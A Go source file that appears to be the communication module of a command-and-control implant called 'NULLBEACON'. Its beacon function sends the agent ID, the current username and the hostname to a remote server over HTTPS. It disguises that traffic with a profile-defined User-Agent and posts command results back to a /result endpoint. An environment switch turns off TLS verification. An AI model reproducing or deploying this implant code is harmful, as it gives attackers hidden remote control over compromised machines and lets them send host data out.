package main

import (
	"crypto/tls"
	"crypto/x509"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

func newHTTPClient() *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
		},
	}

	if strings.EqualFold(os.Getenv("NULLBEACON_INSECURE_TLS"), "true") {
		transport.TLSClientConfig.InsecureSkipVerify = true
		return &http.Client{Timeout: 10 * time.Second, Transport: transport}
	}

	if certPath := strings.TrimSpace(os.Getenv("NULLBEACON_CA_CERT")); certPath != "" {
		certPEM, err := os.ReadFile(certPath)
		if err == nil {
			pool := x509.NewCertPool()
			if pool.AppendCertsFromPEM(certPEM) {
				transport.TLSClientConfig.RootCAs = pool
			}
		}
	}

	return &http.Client{Timeout: 10 * time.Second, Transport: transport}
}

func beaconHTTP(serverAddr, agentID, username, hostname string) (string, error) {
	url := "https://" + serverAddr + activeProfile.BeaconURL
	message := agentID + ":" + username + ":" + hostname
	req, err := http.NewRequest("POST", url, strings.NewReader(message))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", activeProfile.UserAgent)
	client := newHTTPClient()
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func sendResult(serverAddr, agentID, output string) error {
	url := "https://" + serverAddr + "/result"
	body := agentID + ":" + output
	req, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", activeProfile.UserAgent)
	client := newHTTPClient()
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
